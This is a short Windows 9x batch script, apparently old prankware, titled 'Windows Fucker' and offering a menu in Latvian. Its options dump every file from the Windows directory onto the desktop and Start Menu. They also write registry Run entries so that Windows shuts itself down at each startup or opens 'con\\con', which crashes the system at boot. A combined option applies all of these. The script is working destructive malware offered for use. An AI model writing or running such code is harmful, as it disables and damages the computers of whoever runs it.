   @echo off
   cls
   echo -=[ Windows Fucker ]=-
   echo http://www.misc.valsts.lv
   echo.
   echo A  : Piedraazt desktopu   :
   echo B  : Piedraazt Start Menu :
   echo C  : Nokaart Windows      :
   echo D  : Nokaart Windows - 2  :
   echo E  : Piedraazt visu       :
   echo F  : eXit             :
   echo.
   choice /c:abcdef Chose ur destiny:
   if errorlevel 6 goto end
   if errorlevel 5 goto pv
   if errorlevel 4 goto nw2
   if errorlevel 3 goto nw
   if errorlevel 2 goto psm
   if errorlevel 1 goto pd

   :pd
   cd %windir%
   cls
   copy *.* %windir%\desktop
   cls
   goto End

   :psm
   cd %windir%
   cls
   copy *.* %windir%\desktop\startm~1
   cls
   goto End

   :nw
   cd %windir%
   cls
   echo REGEDIT4 >> misc.reg
   cls
   echo.
   cls
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> misc.reg
   cls
   echo "winfukker"="RUNDLL.EXE user.exe,exitwindows" >> misc.reg
   cls
   regedit misc.reg
   cls
   pause
   del misc.reg
   cls
   goto End

   :nw2
   cd %windir%
   cls
   echo REGEDIT4 >> misc.reg
   cls
   echo.
   cls
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> misc.reg
   cls
   echo "winfux0rer"="con\\con" >> misc.reg
   cls
   regedit misc.reg
   cls
   pause
   del misc.reg
   cls
   goto End

   :pv
   cd %windir%
   cls
   copy *.* %windir%\desktop
   cls
   cd \
   cls
   cd %windir%
   cls
   copy *.* %windir%\desktop\startm~1
   cls
   cd \
   cls
   cd %windir%
   cls
   echo REGEDIT4 >> misc.reg
   cls
   echo.
   cls
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> misc.reg
   cls
   echo "winfuks0rer"="con\\con" >> misc.reg
   cls
   regedit misc.reg
   cls
   pause
   del misc.reg
   cls
   cd \
   cls
   cd %windir%
   cls
   echo REGEDIT4 >> misc.reg
   cls
   echo.
   cls
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> misc.reg
   cls
   echo "winfukker"="RUNDLL.EXE user.exe,exitwindows" >> misc.reg
   cls
   regedit misc.reg
   cls
   pause
   del misc.reg
   cls
   goto End

   :End
